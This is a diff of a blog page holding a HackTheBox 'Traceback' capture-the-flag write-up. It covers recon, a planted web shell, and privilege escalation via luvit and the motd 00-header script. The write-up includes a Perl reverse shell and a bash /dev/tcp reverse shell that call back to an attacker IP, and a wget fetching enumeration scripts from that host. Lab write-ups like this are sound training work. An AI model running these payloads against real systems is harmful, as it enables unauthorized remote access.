@@ -1,134 +1,86 @@
 <!DOCTYPE html>
-<html lang="en-us">
-
+<html>
 <head>
-  <title>HackTheBox Traceback Write Up w/o Metasploit | Ajdin&#39;s blog about security and development</title>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBox Traceback Write Up w/o Metasploit - AJDIN</title><link rel="icon" type="image/png" href=icons/myicon.png /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="HackTheBox Traceback Write Up w/o Metasploit" />
+<meta property="og:description" content="Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/htb/traceback/" />
+<meta property="article:published_time" content="2020-08-18T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-08-18T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox Traceback Write Up w/o Metasploit"/>
+<meta name="twitter:description" content="Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access."/>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
 
-  <meta charset="UTF-8">
-  <meta name="language" content="en">
-  <meta name="description" content="Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access.">
-  <meta name="keywords" content="">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/main.css" />
+	<link rel="stylesheet" type="text/css" href="http://example.org/css/custom.css" />
+	<link rel="stylesheet" type="text/css" href="http://example.org/css/dark.css"  />
+	<link rel="stylesheet" type="text/css" href="http://example.org/css/custom-dark.css"  />
 
-  
-  
-  <meta name="twitter:card" content="summary" />
-  <meta name="twitter:title" content="HackTheBox Traceback Write Up w/o Metasploit" />
-  <meta name="twitter:description" content="Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access."/>
-  <meta name="twitter:site" content="@ajdintrejic" />
-  <meta name="twitter:creator" content="https://twitter.com/ajdintrejic" />
-  
-
-  <link rel="shortcut icon" type="image/png" href="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/120/apple/237/water-wave_1f30a.png" />
-
-  
-  
-    
- 
-  
-  
-  
-  
-  
-  
-    
-    <link type="text/css" rel="stylesheet" href="/css/post.min.89fa77e4b9794341578ef456e6f2f0e8217abeb3b9cedd3c659ff7f5ba6c0c3d.css" integrity="sha256-ifp35Ll5Q0FXjvRW5vLw6CF6vrO5zt08ZZ/39bpsDD0="/>
-  
-    
-    <link type="text/css" rel="stylesheet" href="/css/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="/>
-  
-  
-   
-   
-    
-
-<script type="application/ld+json">
-  
-    { 
-      "@context": "http://schema.org", 
-      "@type": "WebSite", 
-      "url": "https:\/\/ajdin.io\/posts\/htb\/traceback\/",
-      "name": "HackTheBox Traceback Write Up w\/o Metasploit",
-      "author": {
-        "@type": "Person",
-        "name": ""
-      },
-      "description": "Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua\/luvit to sysadmin and echo a reverse shell in 00-header file to get root access."
-    }
-  
-  </script>
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-165836726-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<script src="http://example.org/js/main.js"></script>
+	<script src="http://example.org/js/abc.js"></script>
+	<script src="http://example.org/js/xyz.js"></script>
+	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
 </head>
 
 <body>
-  <div class="burger__container">
-  <div class="burger" aria-controls="navigation" aria-label="Menu">
-    <div class="burger__meat burger__meat--1"></div>
-    <div class="burger__meat burger__meat--2"></div>
-    <div class="burger__meat burger__meat--3"></div>
-  </div>
+	<div class="container wrapper post">
+		<div class="header">
+	<base href="http://example.org/">
+	<h1 class="site-title"><a href="http://example.org/">AJDIN</a></h1>
+	<div class="site-description"><h2>welcome to ajdin.io</h2><nav class="nav social">
+			<ul class="flat"><a href="https://github.com/ajdintrejic" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/ajdintrejic" title="Twitter"><i data-feather="twitter"></i></a><a href="mailto:ajdintrejic@protonmail.ch" title="Mail"><i data-feather="mail"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">Archive</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/categories">Categories</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
 </div>
- 
-
-  <nav class="nav" id="navigation">
-  <ul class="nav__list">
-    
-    
-      <li>
-        <a  href="/about">about</a>
-      </li>
-    
-      <li>
-        <a  href="/posts">blog</a>
-      </li>
-    
-      <li>
-        <a  href="/cv">cv</a>
-      </li>
-    
-      <li>
-        <a  href="/">home</a>
-      </li>
-    
-  </ul>
-</nav>
 
 
-  <main>
-    
-    
+		<div class="post-header">
+			<h1 class="title">HackTheBox Traceback Write Up w/o Metasploit</h1>
+			<div class="meta">Posted at &mdash; Aug 18, 2020</div>
+		</div>
 
-    <div class="flex-wrapper">
-      <div class="post__container">
-        <div class="post">
-          <header class="post__header">
-            <h1 id="post__title">HackTheBox Traceback Write Up w/o Metasploit</h1>
-            <time datetime="2020-08-18 00:00:00 &#43;0000 UTC" class="post__date">Aug 18 2020</time> 
-          </header>
-          <article class="post__content">
-              
+		<div class="markdown">
+            
 <p>Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access. If you have any questions you can find me on twitter @ajdintrejic.</p>
 <h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
 <p>Let’s run a quick nmap and full nmap scan in background:</p>
-<pre><code>#top 1000 ports
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#top 1000 ports
 sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.181
 
 #all ports
 sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181  
-</code></pre>
-<ul>
+</code></pre></div><ul>
 <li>-sC: run default script scan</li>
 <li>-sV: probe open ports to determine service/version info</li>
 <li>-O: OS detection</li>
@@ -150,9 +102,8 @@ sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181
 
 
 <p>I’ll also ran gobuster:</p>
-<pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.181 -x php,html -t 100
-</code></pre>
-<p>But before it was finished I found out the next step. It also had a lot of errors (due to having a bad connection). So I won’t paste it here as it’s not important.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.181 -x php,html -t 100
+</code></pre></div><p>But before it was finished I found out the next step. It also had a lot of errors (due to having a bad connection). So I won’t paste it here as it’s not important.</p>
 <h2 id="getting-user">Getting user<a class="anchor" href="#getting-user">#</a></h2>
 <p>We can assume the hacker left in a shell by that comment. We can google that comment and find a repo containing some web shells.</p>
 
@@ -184,24 +135,22 @@ sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181
 <h4 id="reverse-shell-as-webadmin">Reverse shell as webadmin</h4>
 <p>I couldn’t get it to work with nc but I did it with a perl reverse script from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.</p>
 <p>Start a nc listener for reverse shell on your local machine (I used port 1233) with:</p>
-<pre><code>sudo nc -lvnp 1233 
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo nc -lvnp 1233 
+</code></pre></div>
   <img src="/htb/traceback/nc.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>On backdoor webpage execute the payload but make sure to edit the IP and port.</p>
-<pre><code class="language-perl">perl -e 'use Socket;
-$i=&quot;10.10.15.209&quot;;
-$p=1233;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));
-if(connect(S,sockaddr_in($p,inet_aton($i)))){
-	open(STDIN,&quot;&gt;&amp;S&quot;);
-	open(STDOUT,&quot;&gt;&amp;S&quot;);
-	open(STDERR,&quot;&gt;&amp;S&quot;);
-	exec(&quot;/bin/sh -i&quot;);
-};'
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl">perl <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;use Socket;
+</span><span style="color:#e6db74">$i=&#34;10.10.15.209&#34;;
+</span><span style="color:#e6db74">$p=1233;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));
+</span><span style="color:#e6db74">if(connect(S,sockaddr_in($p,inet_aton($i)))){
+</span><span style="color:#e6db74">	open(STDIN,&#34;&gt;&amp;S&#34;);
+</span><span style="color:#e6db74">	open(STDOUT,&#34;&gt;&amp;S&#34;);
+</span><span style="color:#e6db74">	open(STDERR,&#34;&gt;&amp;S&#34;);
+</span><span style="color:#e6db74">	exec(&#34;/bin/sh -i&#34;);
+</span><span style="color:#e6db74">};&#39;</span>
+</code></pre></div>
   <img src="/htb/traceback/nc2.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
@@ -211,11 +160,10 @@ if(connect(S,sockaddr_in($p,inet_aton($i)))){
 
 
 <p>We can cat /etc/passwd and see that we have to get into the sysadmin account.</p>
-<pre><code>sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
-</code></pre>
-<h3 id="ssh-keygen">ssh-keygen<a class="anchor" href="#ssh-keygen">#</a></h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
+</code></pre></div><h3 id="ssh-keygen">ssh-keygen<a class="anchor" href="#ssh-keygen">#</a></h3>
 <p>Let’s create out ssh keys while we’re here.</p>
-<pre><code>$ ssh-keygen
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ssh-keygen
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/webadmin/.ssh/id_rsa): 
 Enter passphrase (empty for no passphrase): 
@@ -224,7 +172,7 @@ Your identification has been saved in /home/webadmin/.ssh/id_rsa.
 Your public key has been saved in /home/webadmin/.ssh/id_rsa.pub.
 The key fingerprint is:
 SHA256:Yt9f+khAXW3DKXb83bieDKCgScOpwFjMwx7+uiZYZBY webadmin@traceback
-The key's randomart image is:
+The key&#39;s randomart image is:
 +---[RSA 2048]----+
 | +            +..|
 |  E        . + *o|
@@ -236,12 +184,10 @@ The key's randomart image is:
 |o o        o ++  |
 | o..        +..  |
 +----[SHA256]-----+
-</code></pre>
-<p>Copy the private key id_rsa to your machine and add the public key id_rsa.pub into authorized keys with</p>
-<pre><code>echo &quot;\n\n&quot; &gt;&gt; authorized_keys
+</code></pre></div><p>Copy the private key id_rsa to your machine and add the public key id_rsa.pub into authorized keys with</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#34;\n\n&#34; &gt;&gt; authorized_keys
 cat id_rsa.pub &gt;&gt; authorized_keys
-</code></pre>
-<p>We can ssh into the box now.</p>
+</code></pre></div><p>We can ssh into the box now.</p>
 
   <img src="/htb/traceback/nc4.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
@@ -253,28 +199,25 @@ cat id_rsa.pub &gt;&gt; authorized_keys
 
 
 <p>After this we can grab the files and run them on the server. I created a /tmp/ajdin and pulled these files with wget :</p>
-<pre><code>wget http://10.10.15.209:1232/LinEnum.sh
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">wget http://10.10.15.209:1232/LinEnum.sh
 wget http://10.10.15.209:1232/linpeas.sh
-</code></pre>
-<p>Looking at the output of linpeas.sh I’ve found 3 things:</p>
+</code></pre></div><p>Looking at the output of linpeas.sh I’ve found 3 things:</p>
 <ul>
 <li>We have a file /home/webadmin/note.txt</li>
 <li>If we can get sysadmin account we can probably escalate privileges to root with files/scripts found in /etc/update-motd.d/</li>
 <li>We have a SUID binary /home/sysadmin/luvit which we can run as webadmin</li>
 </ul>
 <p>We can check out the note first:</p>
-<pre><code>$ cat /home/webadmin/note.txt
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat /home/webadmin/note.txt
 - sysadmin -
 I have left a tool to practice Lua.
-I'm sure you know where to find it.
+I&#39;m sure you know where to find it.
 Contact me if you have any question.
-</code></pre>
-<p>Okay, let’s remember lua, and carry on. The /etc/update-motd.d/ dir contains a script file 00-header</p>
-<pre><code>$ cat 00-header
+</code></pre></div><p>Okay, let’s remember lua, and carry on. The /etc/update-motd.d/ dir contains a script file 00-header</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat 00-header
 &lt;removed, not important&gt;[ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release
-echo &quot;\nWelcome to Xh4H land \n&quot;
-</code></pre>
-<p>but wait we’ve seen this text before, when we ssh’d into the box.</p>
+echo &#34;\nWelcome to Xh4H land \n&#34;
+</code></pre></div><p>but wait we’ve seen this text before, when we ssh’d into the box.</p>
 
   <img src="/htb/traceback/ssh.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
@@ -286,170 +229,65 @@ echo &quot;\nWelcome to Xh4H land \n&quot;
 
 
 <p>Wait so it has to do something with lua? If we check lua on GTFOBin, we can spawn a shell and escalate privileges:</p>
-<pre><code>lua -e 'os.execute(&quot;/bin/sh&quot;)'
-</code></pre>
-<p>but we have luvit so let’s try</p>
-<pre><code>$ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute(&quot;/bin/sh&quot;)'
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">lua -e &#39;os.execute(&#34;/bin/sh&#34;)&#39;
+</code></pre></div><p>but we have luvit so let’s try</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&#34;/bin/sh&#34;)&#39;
 sh: turning off NDELAY mode
 whoami
 sysadmin
-</code></pre>
-<p>We can now get the flag and continue:</p>
-<pre><code>cat user.txt
+</code></pre></div><p>We can now get the flag and continue:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">cat user.txt
 addd2ba938b3b4bf2e15374f413aee04
-</code></pre>
-<h2 id="getting-root">Getting Root<a class="anchor" href="#getting-root">#</a></h2>
+</code></pre></div><h2 id="getting-root">Getting Root<a class="anchor" href="#getting-root">#</a></h2>
 <p>Amazing. Now let’s get back to that /etc/upadate-motd.d/ dir as sysadmin and try to get code execution as root:</p>
-<pre><code>$ echo “whoami” &gt;&gt; 00-header
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ echo “whoami” &gt;&gt; 00-header
+</code></pre></div>
   <img src="/htb/traceback/root.png"  alt="nmap scan"  class="center"  style="border-radius: 0px;"  />
 
 
 <p>For some reason you can’t make your ssh keys for this user. Anyway, we’ll insert the reverse shell bash payload into the 00-header .</p>
 <p>First start netcat listener on port 1250 nc -lvnp 1250 . Now insert the reverse shell payload:</p>
-<pre><code>echo &quot;/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.136/1250 0&gt;&amp;1'&quot; &gt;&gt; 00-header
-</code></pre>
-<p>And log back in. Now our netcat listener has a shell.</p>
-<pre><code>root@traceback:/# cat /root/root.txt
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#34;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.136/1250 0&gt;&amp;1&#39;&#34; &gt;&gt; 00-header
+</code></pre></div><p>And log back in. Now our netcat listener has a shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@traceback:/# cat /root/root.txt
 2218cd7369604176712a79ad09dd5414
-</code></pre>
-<p>Thanks for reading. If you have any questions feel free to reach out to me on Twitter @ajdintrejic.</p>
+</code></pre></div><p>Thanks for reading. If you have any questions feel free to reach out to me on Twitter @ajdintrejic.</p>
 
 
-              
-          </article>
-          
+		</div>
 
-<ul class="tags__list">
-    
-    <li class="tag__item">
-        <a class="tag__link" href="https://ajdin.io/tags/smevk.php/">smevk.php</a>
-    </li>
-    <li class="tag__item">
-        <a class="tag__link" href="https://ajdin.io/tags/ssh/">ssh</a>
-    </li>
-    <li class="tag__item">
-        <a class="tag__link" href="https://ajdin.io/tags/moth/">moth</a>
-    </li>
-    <li class="tag__item">
-        <a class="tag__link" href="https://ajdin.io/tags/luvit/">luvit</a>
-    </li>
-    <li class="tag__item">
-        <a class="tag__link" href="https://ajdin.io/tags/lua/">lua</a>
-    </li>
-    <li class="tag__item">
-        <a class="tag__link" href="https://ajdin.io/tags/suid/">suid</a>
-    </li></ul>
-
- <div class="pagination">
-  
-    
-      <a class="pagination__item" href="https://ajdin.io/posts/worklog/">
-          <span class="pagination__label">Previous Post</span>
-          <span class="pagination__title">Building Worklog: a PERN stack web application</span>
-      </a>
-    
-
-    
-      <a class="pagination__item" href="https://ajdin.io/posts/pg/">
-        <span class="pagination__label">Next Post</span>
-        <span class="pagination__title" >Connecting and using PostgreSQL to a NodeJS app</a>
-      </a>
-    
-    
+		<div class="post-tags">
+			
+				
+					<nav class="nav tags">
+							<ul class="flat">
+								
+								<li><a href="/tags/smevk.php">smevk.php</a></li>
+								
+								<li><a href="/tags/ssh">ssh</a></li>
+								
+								<li><a href="/tags/moth">moth</a></li>
+								
+								<li><a href="/tags/luvit">luvit</a></li>
+								
+								<li><a href="/tags/lua">lua</a></li>
+								
+								<li><a href="/tags/suid">suid</a></li>
+								
+							</ul>
+					</nav>
+				
+			
+		</div>
+		</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div> © All rights reserved |  <a href="https://twitter.com/ajdintrejic">Ajdin Trejić</a></div>
+	</nav>
 </div>
 
-          
-          <footer class="post__footer">
-            
 
 
-<div class="social-icons">
-  
-     
-    
-      <a class="social-icons__link" title="Twitter"
-         href="https://twitter.com/ajdintrejic"
-         target="_blank" rel="noopener">
-        <div class="social-icons__icon" style="background-image: url('https://ajdin.io/svg/twitter.svg')"></div>
-      </a>
-    
-  
-     
-    
-      <a class="social-icons__link" title="GitHub"
-         href="https://github.com/ajdintrejic"
-         target="_blank" rel="noopener">
-        <div class="social-icons__icon" style="background-image: url('https://ajdin.io/svg/github.svg')"></div>
-      </a>
-    
-  
-     
-    
-      <a class="social-icons__link" title="Email"
-         href="mailto:ajdintrejic@protonmail.ch"
-         target="_blank" rel="noopener">
-        <div class="social-icons__icon" style="background-image: url('https://ajdin.io/svg/email.svg')"></div>
-      </a>
-    
-  
-     
-    
-      <a class="social-icons__link" title="LinkedIn"
-         href="https://www.linkedin.com/in/ajdin-treji%C4%87-5103441b4/"
-         target="_blank" rel="noopener">
-        <div class="social-icons__icon" style="background-image: url('https://ajdin.io/svg/linkedin.svg')"></div>
-      </a>
-    
-     
-</div>
-
-            <p>© 2020</p>
-          </footer>
-          </div>
-      </div>
-      
-      <div class="toc-container">
-          
-        <nav id="TableOfContents">
-  <ul>
-    <li><a href="#reconnaissance">Reconnaissance</a></li>
-    <li><a href="#getting-user">Getting user</a>
-      <ul>
-        <li><a href="#smevkphp">Smevk.php</a></li>
-        <li><a href="#ssh-keygen">ssh-keygen</a></li>
-        <li><a href="#enumeration">Enumeration</a></li>
-        <li><a href="#luvit-privilege-escalation">Luvit privilege escalation</a></li>
-      </ul>
-    </li>
-    <li><a href="#getting-root">Getting Root</a></li>
-  </ul>
-</nav>
-      </div>
-      
-    </div>
-    
-
-  </main>
-
-   
-
-  
-  <script src="/js/index.min.49e4d8a384357d9b445b87371863419937ede9fa77737522ffb633073aebfa44.js" integrity="sha256-SeTYo4Q1fZtEW4c3GGNBmTft6fp3c3Ui/7YzBzrr&#43;kQ=" crossorigin="anonymous"></script>
-  
-  
-  <script src="https://unpkg.com/prismjs@1.20.0/components/prism-core.min.js"></script>
-
-  
-  <script src="https://unpkg.com/prismjs@1.20.0/plugins/autoloader/prism-autoloader.min.js"
-    data-autoloader-path="https://unpkg.com/prismjs@1.20.0/components/"></script>
-
-  
-    <script src="/js/table-of-contents.js"></script>
-  
-
-
+<script>feather.replace()</script>
 </body>
-
 </html>
